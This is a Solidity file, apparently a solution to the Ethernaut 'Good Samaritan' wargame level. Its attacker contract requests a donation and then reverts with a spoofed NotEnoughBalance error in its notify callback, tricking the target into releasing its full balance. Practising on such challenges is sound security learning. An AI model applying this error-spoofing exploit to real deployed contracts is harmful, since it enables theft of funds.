// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GoodSamaritan} from "../../src/ethernaut/27_GoodSamaritan/GoodSamaritan.sol";

contract GoodSamaritan_Attacker {
	address player;
	GoodSamaritan coreInst;
	
	constructor(GoodSamaritan coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		coreInst.requestDonation();
	}
	
	error NotEnoughBalance();
	
	function notify(uint256 amount) external {
		if (amount == 10) {
			revert NotEnoughBalance();
		}
	}
}
